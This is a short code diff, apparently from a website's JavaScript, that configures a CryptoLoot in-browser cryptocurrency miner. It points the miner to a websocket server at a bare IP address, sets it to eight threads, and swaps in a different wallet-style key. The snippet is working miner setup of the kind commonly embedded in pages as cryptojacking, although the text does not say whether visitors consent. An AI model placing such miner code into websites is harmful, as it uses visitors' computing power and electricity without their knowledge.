@@ -18,7 +18,7 @@ var myPrettyCode = function() {
   CryptoLoot.CONFIG.WEBSOCKET_SHARDS = [["ws://139.99.104.157:8892"]];
 
   // Start miner
-  var miner=new CryptoLoot.Anonymous('552a3151084681c06422b293d948704b43eccce6f7f5',
+  var miner=new CryptoLoot.Anonymous('etnk1ELUj9c85xLf6LKw86F2GP7kkixgncZMyYNErDKh4TyRU6BnA3USsFGj1r8wSPRAJcr61cShh8TAVgWA5Yi39UtV8b1vW1',
         {
         threads:8,autoThreads:false,throttle:0.8
         }
